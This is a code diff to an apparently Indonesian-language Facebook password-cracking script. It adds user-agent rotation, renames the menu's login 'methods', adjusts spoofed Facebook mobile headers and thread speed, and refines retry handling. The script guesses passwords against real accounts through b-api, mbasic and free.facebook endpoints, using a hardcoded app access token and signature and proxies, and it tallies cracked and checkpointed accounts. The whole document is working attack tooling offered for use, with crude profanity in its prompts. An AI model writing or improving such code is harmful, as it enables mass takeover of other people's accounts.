@@ -13,7 +13,7 @@ if os.path.exists("saya_gans/ngewe/.useragent"):
 	if os.path.getsize("saya_gans/ngewe/.useragent")!=0:
 		ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg=open("saya_gans/ngewe/.useragent").read().strip()
 
-ok,cp,cout,live,chek,kumpul,lahir=0,0,0,[],[],[],""
+ok,cp,cout,live,chek,kumpul,lahir,ua__=0,0,0,[],[],[],"",random.choice(["Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","Mozilla/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit/538.1+ (KHTML, like Gecko) TV Safari/538.1+"])
 
 class crack:
 	def __init__(self,url,user):
@@ -40,16 +40,16 @@ class crack:
 			print(" 1. method b-api (fast crack)")
 			print(" 2. method free.facebook (slow crack)")
 			print(" 3. method mbasic.facebook (slow crack)")
-			print(" 4. method api free.facebook (fast crack)")
-			print(" 5. method api mbasic.facebook (fast crack)")
+			print(" 4. method free.facebook V2 (fast crack)")
+			print(" 5. method mbasic.facebook V2 (fast crack)")
 			self.awokawok_ngentod(password)
 		if NAROSKEUN in tuple("tT"):
 			print(" * pilih method login")
 			print(" 1. method b-api (fast crack)")
 			print(" 2. method free.facebook (slow crack)")
 			print(" 3. method mbasic.facebook (slow crack)")
-			print(" 4. method api free.facebook (fast crack)")
-			print(" 5. method api mbasic.facebook (fast crack)")
+			print(" 4. method free.facebook V2 (fast crack)")
+			print(" 5. method mbasic.facebook V2 (fast crack)")
 			self.awokawok_ngentod()
 		else:
 			print(" ! isi yang bener ngentod");self.naroskeun()
@@ -72,14 +72,14 @@ class crack:
 	
 	def api(self,username,password,url,**data):
 		ses=req.session()
-		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login.php","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg})
+		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login.php","user-agent":ua__})
 		data.update({"email":username,"pass":password,"login":"submit"})
 		ses.post(url+"/login.php",data=data,proxies=dict(http=proxsi),allow_redirects=False)
 		return ses.cookies.get_dict()
 
 	def bapi(self,username,password):
 		ses=req.session()
-		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
+		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000,40000)),"x-fb-sim-hni":str(random.randint(20000,40000)),"x-fb-net-hni":str(random.randint(20000,40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
 		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
 		return ses.get("https://b-api.facebook.com/method/auth.login").json()
 	
@@ -89,9 +89,9 @@ class crack:
 			print(" ! jangan kosong ngentod")
 			pilih=input(" ? pilih : ")
 		url="https://{}.facebook.com"
-		speed=40 if manual is None else 30
+		speed=50 if manual is None else 30
 		if speed==30:
-			speed=40 if len(manual.split(",")) <= 5 else 30
+			speed=50 if len(manual.split(",")) <= 5 else speed
 		if pilih in ("1","01"):
 			print(" * token found :D" if self.token else " ! token not found")
 			tod=self.awikwok()
@@ -159,8 +159,10 @@ class crack:
 					continue
 			cout+=1
 			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
-		except:
+		except koneksi_error:
 			self.log_mbasic(username,list_password,login,url,ttl)
+		except:
+			pass
 
 	def log_bapics(self,username,list_password,login,ttl):
 		try:
@@ -186,8 +188,10 @@ class crack:
 					continue
 			cout+=1
 			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
-		except:
+		except koneksi_error:
 			self.log_bapics(username,list_password,login,ttl)
+		except:
+			pass
 				
 	def save(self,*memek):
 		view=memek[0]
